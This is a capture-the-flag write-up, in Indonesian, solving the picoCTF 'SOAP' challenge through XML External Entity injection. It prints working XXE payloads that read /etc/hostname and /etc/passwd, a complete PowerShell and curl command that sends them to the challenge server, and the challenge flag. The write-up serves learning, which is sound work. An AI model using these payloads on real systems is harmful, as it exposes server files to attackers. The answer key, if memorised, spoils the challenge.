# SOAP

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Aplikasi Flask "Computer Science" dengan halaman detail universitas. Tombol
"Details" mengirim form yang diubah JavaScript menjadi request XML ke
`/data`. Parameter `ID` disisipkan mentah ke dalam XML — rentan XML External
Entity (XXE). Flag disembunyikan di field GECOS user `picoctf` dalam
`/etc/passwd`.

## Informasi Awal

Instance:

```text
http://saturn.picoctf.net:59571/
```

Recon:

- Halaman utama memuat form POST ke `/data` dengan hidden input `ID` (1, 2, 3).
- Script `/static/js/xmlDetailsCheckPayload.js` mengubah FormData menjadi XML
  dan mengirimnya dengan `Content-Type: application/xml`:

```javascript
xml += '<' + key + '>' + value + '</' + key + '>';
```

- Jadi body request: `<data><ID>1</ID></data>`.

## Tools

- curl.exe (probing; dari PowerShell dengan `--data-binary "@file"`)
- Python (script `xxe.py` untuk pembacaan file yang andal)

## Analisis

### Refleksi nilai ID

POST `<data><ID>zzz</ID></data>` mengembalikan `Invalid ID: zzz` — nilai
direfleksikan ke respons. POST `<data><ID>2</ID></data>` mengembalikan konten
detail. Refleksi inilah kanal output untuk XXE.

### Entity di-expand

Dengan body dari file (bukan inline, karena PowerShell meng-mangle karakter
`&` pada `--data`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY x "INTERNAL-OK">]>
<data><ID>&x;</ID></data>
```

Respons: `Invalid ID: INTERNAL-OK` — internal entity di-expand.

### External entity berfungsi

```xml
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
```

mengembalikan `Invalid ID: challenge` — pembacaan file lokal bekerja.

### Jawaban akhir di /etc/passwd

Path flag umum (`/flag.txt`, `/app/flag`, dst.) semuanya `None`. Kunci ada di
`file:///etc/passwd`: baris terakhir memuat user `picoctf` dengan flag di
kolom GECOS (keterangan lengkap user):

```text
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```

## Langkah Penyelesaian

1. Kirim request XML ber-DOCTYPE dengan external entity yang membaca
   `/etc/passwd` (disimpan ke file lalu dikirim dengan `--data-binary`:

```powershell
$b = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data><ID>&xxe;</ID></data>'
$b | Out-File -Encoding ascii "$env:TEMP\body.xml"
curl.exe -s -X POST "http://saturn.picoctf.net:59571/data" -H "Content-Type: application/xml" --data-binary "@$env:TEMP\body.xml"
```

2. Baca baris user `picoctf` pada output — flag ada di kolom GECOS.

## Flag

```text
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```

## Pembelajaran

- Form HTML bisa menyembunyikan format request yang berbeda — selalu periksa
  JS yang menangani submit (`xmlDetailsCheckPayload.js` membocorkan format XML).
- Refleksi nilai pada pesan error ("Invalid ID: ...") adalah kanal output
  ideal untuk error-based XXE.
- Kegagalan payload inline dari PowerShell bukan berarti payload salah:
  karakter `&` di-mangle shell. Kirim body lewat file (`--data-binary @file`)
  untuk hasil deterministik.
- Saat flag tidak ada di path umum, `/etc/passwd` tetap bacaan wajib — kolom
  GECOS adalah tempat penyembunyian flag yang klasik.
- `/proc/self/environ` dan `/proc/self/cmdline` sering kosong dibaca parser
  XML karena ukuran file 0; listing direktori juga tidak didukung.

## Referensi

- OWASP XML External Entity (XXE) Processing
- PayloadsAllTheThings — XXE Injection